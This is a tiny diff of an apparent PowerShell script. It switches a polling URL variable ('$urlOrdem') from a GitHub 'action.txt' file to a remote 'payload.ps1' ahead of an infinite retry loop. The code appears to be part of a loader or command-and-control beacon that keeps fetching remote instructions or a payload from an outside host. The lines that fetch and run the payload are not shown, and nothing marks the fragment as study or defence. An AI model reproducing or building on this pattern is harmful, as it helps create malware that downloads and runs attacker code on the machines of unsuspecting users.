@@ -1,4 +1,4 @@
-$urlOrdem = "https://raw.githubusercontent.com/Thiii123/my-tools/main/action.txt"
+$urlOrdem = "https://raw.githubusercontent.com/Thiii123/my-tools/refs/heads/main/payload.ps1"
 
 while($true) {
     try {
